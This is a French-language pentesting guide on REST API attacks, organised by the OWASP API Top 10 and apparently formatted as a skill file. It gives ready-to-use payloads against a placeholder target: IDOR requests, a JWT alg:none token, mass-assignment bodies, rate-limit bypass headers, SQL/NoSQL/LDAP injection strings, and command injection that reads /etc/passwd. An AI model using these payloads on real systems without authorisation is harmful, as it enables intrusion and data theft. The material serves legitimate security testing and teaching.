---
name: api-hacking-guide
description: Guide complet de hacking d'API REST — OWASP API Top 10, fuzzing, rate limiting bypass, IDOR, mass assignment, SSRF, injection
category: cybersecurite
---

# API Hacking — Guide Avancé

## Introduction

Les API REST sont le cœur des applications modernes. Contrairement aux pages web, les API exposent des endpoints fonctionnels directement exploitables. L'OWASP API Security Top 10 est la référence.

## OWASP API Top 10 (2023)

1. **API1-2023: Broken Object Level Authorization (BOLA/IDOR)**
2. **API2-2023: Broken Authentication**
3. **API3-2023: Broken Object Property Level Authorization**
4. **API4-2023: Unrestricted Resource Consumption**
5. **API5-2023: Broken Function Level Authorization**
6. **API6-2023: Unrestricted Access to Sensitive Business Flows**
7. **API7-2023: Server Side Request Forgery (SSRF)**
8. **API8-2023: Security Misconfiguration**
9. **API9-2023: Improper Inventory Management**
10. **API10-2023: Unsafe Consumption of APIs**

## Découverte d'Endpoints

### Découverte Passive
```bash
# Wayback Machine — historique des endpoints
curl "http://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=json&fl=original&collapse=urlkey"

# Google Dorks
site:target.com inurl:api
site:target.com "swagger" OR "openapi" OR "api-docs"
site:target.com "postman" OR "insomnia"

# Certificats SSL
curl "https://crt.sh/?q=%.target.com&output=json"

# JS files — extraire les endpoints
grep -oh '"https?://[^"]*api[^"]*' *.js | sort -u
```

### Découverte Active
```bash
# Katana — crawler headless pour endpoints
katana -u https://target.com -d 5 -jc -kf -o endpoints.txt

# Arjun — paramètre discovery
arjun -u https://api.target.com/users --get

# Dirsearch — fuzzing de chemins
dirsearch -u https://api.target.com/v1/ -w wordlist.txt

# kiterunner — bruteforce d'endpoints API
kr scan http://api.target.com -w api_wordlist.txt
```

### Outils de Documentation
```bash
# Swagger/OpenAPI
curl https://api.target.com/swagger.json
curl https://api.target.com/v1/api-docs
curl https://api.target.com/openapi.json

# Postman collections
curl https://api.target.com/v1/postman/collection

# GraphQL (détection)
curl -X POST https://api.target.com/graphql -H "Content-Type: application/json" -d '{"query":"{__typename}"}'
```

## Attaques par Endpoint

### 1. Broken Object Level Authorization (IDOR)

**Techniques d'IDOR:**
```bash
# UUID / ID manipulation
GET /api/v1/users/123
GET /api/v1/users/124
GET /api/v1/users/125

# UUID encodage
GET /api/v1/users/1 → 401
GET /api/v1/users/1?fields=id,name,email,ssn → 200 (parameter pollution)

# UUID in header
GET /api/v1/users
X-Original-User: admin
```

**Exploitation avancée:**
```bash
# IDOR via JWT — décoder le token
jwt_tool eyJhbGciOiJIUzI1NiJ9...

# IDOR via array d'IDs
POST /api/v1/users/batch
[{"id": 1}, {"id": 2}, {"id": 3}]

# IDOR via wildcard
GET /api/v1/users/*
GET /api/v1/users/%
GET /api/v1/users/../
```

### 2. Broken Authentication

**Attaques sur les tokens:**
```bash
# JWT none algorithm
# Modifier l'en-tête: {"alg":"none"}
# Envoyer token: eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.

# JWT algorithm confusion (RS256 → HS256)
# Obtenir la clé publique, l'utiliser comme secret HMAC

# Token leakage
# Token dans URL (GET), logs, referrer, error messages

# Token rotation — replay attack
# Capturer token valide, réutiliser après logout

# Session fixation
# Forcer un session ID connu
```

**Cookie-based auth:**
```bash
# Session ID dans URL
GET /api/v1/admin?sessionid=abc123

# Session ID dans Referer
GET /api/v1/admin
Referer: https://target.com/?sessionid=abc123

# Session ID prédictible (timestamp base)
```

### 3. Mass Assignment

```bash
# Ajouter des champs non documentés
POST /api/v1/users/signup
{
  "username": "attacker",
  "password": "secret",
  "isAdmin": true,
  "roles": ["admin"],
  "quota": 999999,
  "__proto__": { "admin": true }  # Prototype pollution
}

# Via Content-Type alternatif
Content-Type: application/json
Content-Type: application/xml
Content-Type: application/x-www-form-urlencoded (si l'API accepte)
```

### 4. Rate Limiting Bypass

```bash
# En-têtes X-Forwarded-For
X-Forwarded-For: 127.0.0.2
X-Forwarded-For: 127.0.0.3

# Autres en-têtes IP
X-Real-IP:
X-Originating-IP:
X-Remote-IP:
X-Remote-Addr:
X-Client-IP:
Forwarded: for=127.0.0.2
True-Client-Ip:

# GraphQL alias batching
# Utiliser des alias pour faire plusieurs requêtes en une
```

### 5. Injection dans les Paramètres

**SQL Injection via API:**
```bash
# Paramètres API
GET /api/v1/users?search=' UNION SELECT * FROM passwords--
GET /api/v1/products?id=1 OR 1=1
POST /api/v1/users {"username": "admin'--"}

# NoSQL Injection (MongoDB)
GET /api/v1/users?id[$ne]=
POST /api/v1/users {"$where": "this.admin == true"}
```

**LDAP Injection:**
```bash
GET /api/v1/login?user=admin*&pass=*
# ou
GET /api/v1/login?user=*)(uid=*))&pass=*
```

**Command Injection via API params:**
```bash
GET /api/v1/ping?host=google.com;id
GET /api/v1/convert?file=test.docx;cat /etc/passwd
```

## API Fuzzing Avancé

### Avec ffuf
```bash
# Fuzzing des méthodes HTTP
ffuf -w methods.txt -u https://api.target.com/api/v1/users -X FUZZ -fc 404,405

# Fuzzing des paramètres
ffuf -w params.txt -u https://api.target.com/api/v1/users?FUZZ=1

# Fuzzing des valeurs (enumération d'IDs)
ffuf -w ids.txt -u https://api.target.com/api/v1/users/FUZZ
```

### Content-Type Switching
```bash
# JSON → XML → YAML → Form
curl -X POST https://api.target.com/api/v1/users \
  -H "Content-Type: application/xml" \
  -d '<user><username>admin</username><password>test</password></user>'

# Try charset alternatifs
Accept-Charset: utf-8
Content-Type: application/json; charset=utf-16
```

### HTTP Method Override
```bash
# Bypass de restrictions HTTP
X-HTTP-Method: DELETE
X-HTTP-Method-Override: DELETE
X-Method-Override: DELETE

# En POST
POST /api/v1/users
X-HTTP-Method-Override: DELETE
```

## Outils Complémentaires

| Outil | Description |
|-------|-------------|
| **Postman** | Exploration manuelle + collections |
| **Insomnia** | IDE d'API avec GraphQL |
| **BurpSuite** | Repeater, Intruder, Scanner |
| **ffuf** | Fuzzing HTTP haute performance |
| **Arjun** | Découverte de paramètres |
| **Kiterunner** | Bruteforce d'endpoints API |
| **Autorize (Burp)** | Force brute d'ACL/authorization |
| **AuthMatrix (Burp)** | Matrice d'authentification |
| **JWT_Tool** | Audit et exploitation JWT |
| **Mitmproxy2** | Proxy d'interception avancé |

## Checklist Finale

1. Endpoints API (inventory management)
2. Authentification bypass
3. IDOR sur tous les endpoints object-ID
4. Mass assignment sur les POST/PUT/PATCH
5. Rate limiting bypass
6. SQL/NoSQL injection
7. Command injection
8. SSRF via webhooks/imports
9. HTTP method override
10. Content-Type switching
11. BOLA — chaque endpoint avec Object ID
12. BFLA — admin endpoints access
13. Token/JWT security
14. API keys in source code

## Ressources

- **OWASP API Security Top 10**: https://owasp.org/www-project-api-security/
- **HackTricks API Pentesting**: https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/rest-api-security/index.html
- **PayloadsAllTheThings API**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/API%20Key%20Leaks
- **API Security Universe**: https://github.com/shieldfy/API-Security-101